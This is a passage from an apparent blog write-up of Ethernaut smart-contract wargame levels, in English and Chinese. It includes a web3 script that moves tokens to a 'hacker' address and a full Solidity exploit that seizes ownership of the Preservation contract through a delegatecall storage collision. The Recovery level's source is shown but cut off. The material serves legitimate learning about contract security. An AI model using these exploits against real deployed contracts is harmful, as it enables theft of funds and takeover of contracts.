</span></span><span style="display:flex;"><span>private <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; -^=^- &#39;</span>
</span></span><span style="display:flex;"><span>public <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x153cD5C206630Dbd726891f2aE5e6CF031460cfE&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>hacker_private <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; -^=^- &#39;</span>
</span></span><span style="display:flex;"><span>hacker <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x3465CBfee24B4b369304D3B0471851665034a303&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>empty <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x0000000000000000000000000000000000000001&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>calldata <span style="color:#f92672">=</span> bytes(w3<span style="color:#f92672">.</span>keccak(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;approve(address,uint256)&#39;</span>)[:<span style="color:#ae81ff">4</span>])
</span></span><span style="display:flex;"><span>calldata <span style="color:#f92672">+=</span> encode_abi([<span style="color:#e6db74">&#39;address&#39;</span>, <span style="color:#e6db74">&#39;uint256&#39;</span>], [hacker, <span style="color:#ae81ff">1000000</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">10</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">18</span>)])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>txn <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;from&#34;</span>: public,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;to&#34;</span>: target,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;gasPrice&#34;</span>: w3<span style="color:#f92672">.</span>toWei(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;gwei&#39;</span>),
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;gas&#34;</span>: <span style="color:#ae81ff">0x32185</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;value&#34;</span>: w3<span style="color:#f92672">.</span>toWei(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;wei&#39;</span>),
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;nonce&#34;</span>: w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>getTransactionCount(public),
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;data&#34;</span>: calldata
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>signed_txn <span style="color:#f92672">=</span> w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>account<span style="color:#f92672">.</span>signTransaction(txn, private)
</span></span><span style="display:flex;"><span>txn_hash <span style="color:#f92672">=</span> w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>sendRawTransaction(signed_txn<span style="color:#f92672">.</span>rawTransaction)<span style="color:#f92672">.</span>hex()
</span></span><span style="display:flex;"><span>print(txn_hash)
</span></span><span style="display:flex;"><span>txn_receipt <span style="color:#f92672">=</span> w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>waitForTransactionReceipt(txn_hash)
</span></span><span style="display:flex;"><span>print(txn_receipt)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>calldata <span style="color:#f92672">=</span> bytes(w3<span style="color:#f92672">.</span>keccak(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;transferFrom(address,address,uint256)&#39;</span>)[:<span style="color:#ae81ff">4</span>])
</span></span><span style="display:flex;"><span>calldata <span style="color:#f92672">+=</span> encode_abi([<span style="color:#e6db74">&#39;address&#39;</span>, <span style="color:#e6db74">&#39;address&#39;</span>, <span style="color:#e6db74">&#39;uint256&#39;</span>], [public, empty, <span style="color:#ae81ff">1000000</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">10</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">18</span>)])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>txn <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;from&#34;</span>: hacker,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;to&#34;</span>: target,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;gasPrice&#34;</span>: w3<span style="color:#f92672">.</span>toWei(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;gwei&#39;</span>),
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;gas&#34;</span>: <span style="color:#ae81ff">0x32185</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;value&#34;</span>: w3<span style="color:#f92672">.</span>toWei(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;wei&#39;</span>),
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;nonce&#34;</span>: w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>getTransactionCount(hacker),
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;data&#34;</span>: calldata
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>signed_txn <span style="color:#f92672">=</span> w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>account<span style="color:#f92672">.</span>signTransaction(txn, hacker_private)
</span></span><span style="display:flex;"><span>txn_hash <span style="color:#f92672">=</span> w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>sendRawTransaction(signed_txn<span style="color:#f92672">.</span>rawTransaction)<span style="color:#f92672">.</span>hex()
</span></span><span style="display:flex;"><span>txn_receipt <span style="color:#f92672">=</span> w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>waitForTransactionReceipt(txn_hash)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> txn_receipt[<span style="color:#e6db74">&#39;status&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[+] OK &#39;</span> <span style="color:#f92672">+</span> str(txn_receipt[<span style="color:#e6db74">&#39;transactionIndex&#39;</span>]) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; @ &#39;</span> <span style="color:#f92672">+</span> txn_receipt[<span style="color:#e6db74">&#39;transactionHash&#39;</span>]<span style="color:#f92672">.</span>hex())
</span></span></code></pre></div><h1 id="level-16-preservation">Level 16. Preservation<a hidden class="anchor" aria-hidden="true" href="#level-16-preservation">#</a></h1>
<blockquote>
<p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p>
</blockquote>
<blockquote>
<p>The goal of this level is for you to claim <strong>ownership</strong> of the instance you are given.</p>
</blockquote>
<h2 id="source-10">Source<a hidden class="anchor" aria-hidden="true" href="#source-10">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Preservation</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// public library contracts 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">timeZone1Library</span>;  <span style="color:#75715e">// 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">timeZone2Library</span>;  <span style="color:#75715e">// 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;             <span style="color:#75715e">// 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">storedTime</span>;                  <span style="color:#75715e">// 3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// Sets the function signature for delegatecall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">bytes4</span> <span style="color:#a6e22e">constant</span> <span style="color:#a6e22e">setTimeSignature</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bytes4</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#e6db74">&#34;setTime(uint256)&#34;</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_timeZone1LibraryAddress</span>, <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_timeZone2LibraryAddress</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">timeZone1Library</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_timeZone1LibraryAddress</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">timeZone2Library</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_timeZone2LibraryAddress</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// set the time for timezone 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setFirstTime</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_timeStamp</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">timeZone1Library</span>.<span style="color:#a6e22e">delegatecall</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodePacked</span>(<span style="color:#a6e22e">setTimeSignature</span>, <span style="color:#a6e22e">_timeStamp</span>));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// set the time for timezone 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setSecondTime</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_timeStamp</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">timeZone2Library</span>.<span style="color:#a6e22e">delegatecall</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodePacked</span>(<span style="color:#a6e22e">setTimeSignature</span>, <span style="color:#a6e22e">_timeStamp</span>));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Simple library contract to set the time
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">LibraryContract</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// stores a timestamp 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">storedTime</span>;  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setTime</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_time</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">storedTime</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_time</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="analysis-1">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-1">#</a></h2>
<p>delegatecall调用外部函数storage位置没有对上，造成任意指定storage篡改</p>
<p>target contract : <code>0x4464A38441e76713439883883752A60B02C24298</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>In [<span style="color:#ae81ff">31</span>]: target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x4464A38441e76713439883883752A60B02C24298&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">32</span>]: w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>get_storage_at(target,<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">32</span>]: HexBytes(<span style="color:#e6db74">&#39;0x0000000000000000000000007dc17e761933d24f4917ef373f6433d4a62fe3c5&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">33</span>]: w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>get_storage_at(target,<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">33</span>]: HexBytes(<span style="color:#e6db74">&#39;0x000000000000000000000000ea0de41efafa05e2a54d1cd3ec8ce154b1bb78f1&#39;</span>)
</span></span></code></pre></div><p>从反编译的结果来看library code就如源码中所示的那么简单，修改<code>stoarge 0</code>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Contract</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x40</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x60</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">var0</span>) { <span style="color:#a6e22e">revert</span>(<span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x00</span>]); }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x04</span>) { <span style="color:#a6e22e">revert</span>(<span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x00</span>]); }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">var0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">data</span>[<span style="color:#ae81ff">0x00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x20</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xe0</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">var0</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x3beb26c4</span>) { <span style="color:#a6e22e">revert</span>(<span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x00</span>]); }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x56</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var2</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x04</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">var2</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">var3</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>) { <span style="color:#a6e22e">revert</span>(<span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x00</span>]); }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">func_0041</span>(<span style="color:#a6e22e">var2</span>, <span style="color:#a6e22e">var3</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">stop</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">func_0041</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arg0</span>, <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arg1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">arg0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">data</span>[<span style="color:#a6e22e">arg0</span><span style="color:#f92672">:</span><span style="color:#a6e22e">arg0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">storage</span>[<span style="color:#ae81ff">0x00</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">arg0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>思路是先调用修改timeZone1Library的地址，然后delegatecall执行任意代码。</p>
<h2 id="exp-4">EXP<a hidden class="anchor" aria-hidden="true" href="#exp-4">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Preservation</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setFirstTime</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_timeStamp</span>) <span style="color:#a6e22e">external</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">ClaimOwnership</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">timeZone1Library</span>;  <span style="color:#75715e">// 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">timeZone2Library</span>;  <span style="color:#75715e">// 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;             <span style="color:#75715e">// 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fallback</span>() <span style="color:#a6e22e">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4464A38441e76713439883883752A60B02C24298</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">new_library</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">new_library</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">address</span> (<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ClaimOwnership</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Preservation</span> <span style="color:#a6e22e">t</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Preservation</span>(<span style="color:#a6e22e">target</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">setFirstTime</span>(<span style="color:#a6e22e">uint256</span>(<span style="color:#a6e22e">uint160</span>(<span style="color:#a6e22e">new_library</span>)));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">setFirstTime</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">payable</span>(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="insights">Insights<a hidden class="anchor" aria-hidden="true" href="#insights">#</a></h2>
<p>As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. This is particularly true for contract &ldquo;<code>libraries</code>&rdquo; that have their own state. This example demonstrates why the <code>library</code> <strong>keyword should be used</strong> for building libraries, as <strong>it prevents the libraries from storing and accessing state variables</strong>.</p>
<p>library变量存取state是非常危险的，所以library关键字避免了这个行为。</p>
<h1 id="level-17-recovery">Level 17. Recovery<a hidden class="anchor" aria-hidden="true" href="#level-17-recovery">#</a></h1>
<blockquote>
<p>A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address.</p>
</blockquote>
<blockquote>
<p>This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address.</p>
</blockquote>
<h2 id="source-11">Source<a hidden class="anchor" aria-hidden="true" href="#source-11">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Recovery</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//generate tokens
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generateToken</span>(<span style="color:#a6e22e">string</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">_name</span>, <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">_initialSupply</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SimpleToken</span>(<span style="color:#a6e22e">_name</span>, <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>, <span style="color:#a6e22e">_initialSupply</span>);
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">SimpleToken</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">SafeMath</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">uint256</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// public variables
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">string</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">name</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mapping</span> (<span style="color:#a6e22e">address</span> =&gt; <span style="color:#a6e22e">uint</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">balances</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// constructor
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">string</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">_name</span>, <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_creator</span>, <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">_initialSupply</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_name</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">_creator</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_initialSupply</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// collect ether in return for tokens
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">fallback</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>.<span style="color:#a6e22e">mul</span>(<span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// allow transfers of tokens
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_to</span>, <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_amount</span>) <span style="color:#66d9ef">public</span> { 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">_amount</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>].<span style="color:#a6e22e">sub</span>(<span style="color:#a6e22e">_amount</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">_to</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_amount</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// clean up after ourselves
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">destroy</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">_to</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">_to</span>);
</span></span><span style="display:flex;"><span>  }
